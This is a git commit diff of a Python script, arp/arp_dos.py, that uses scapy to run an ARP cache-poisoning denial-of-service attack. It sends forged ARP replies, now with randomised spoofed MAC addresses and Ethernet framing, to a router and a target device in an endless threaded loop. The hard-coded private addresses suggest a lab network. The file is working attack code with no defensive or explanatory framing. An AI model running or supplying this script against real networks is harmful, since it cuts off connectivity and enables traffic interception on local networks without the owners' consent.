f53e553198410f42cc0ef342c07e90dc2f0141cf
Jack <62919016+JackDunfey@users.noreply.github.com>
2024-10-31 11:44:26 -0400

    Improved?

--- arp/arp_dos.py
+++ arp/arp_dos.py
@@ -1,21 +1,26 @@
 from scapy.all import ARP, Ether, Raw, send
 from time import sleep
 import threading
+from random import randint
 
 ROUTER_IP = "10.9.0.1"
 ROUTER_MAC = "02:42:0c:27:f4:f7"
 
-SPOOF_MAC = "02:42:0c:27:f4:f8"
+def get_mac_address():
+    return "02:00:00:%02x:%02x:%02x" % (randint(0, 255), randint(0, 255), randint(0, 255))
+
 
 def confuse_device(ip, hwaddr):
-    arp_dev = ARP(op=2, psrc=ip, hwsrc=SPOOF_MAC, pdst=ROUTER_IP, hwdst=ROUTER_MAC)
-    # ether_dev = Ether(dst=ROUTER_MAC, src=SPOOF_MAC)
-    arp_router = ARP(op=2, psrc=ROUTER_IP, hwsrc=SPOOF_MAC, pdst=ip, hwdst=hwaddr)
-    # ether_router = Ether(dst=hwaddr, src=SPOOF_MAC)
-    send(arp_dev)
-    send(arp_router)
-    print("Sent?")
+    ADDR = get_mac_address()
+    arp_dev = ARP(op=2, psrc=ip, hwsrc=ADDR, pdst=ROUTER_IP, hwdst=ROUTER_MAC)
+    ether_dev = Ether(dst=ROUTER_MAC, src=ADDR)
+    send(ether_dev/arp_dev)
 
+    ADDR2 = get_mac_address()
+    arp_router = ARP(op=2, psrc=ROUTER_IP, hwsrc=ADDR2, pdst=ip, hwdst=hwaddr)
+    ether_router = Ether(dst=hwaddr, src=ADDR)
+    send(ether_router / arp_router)
+    
 def thread_cofusion(ip_addr, hw_addr):
     while 1:
         confuse_device(ip_addr, hw_addr)
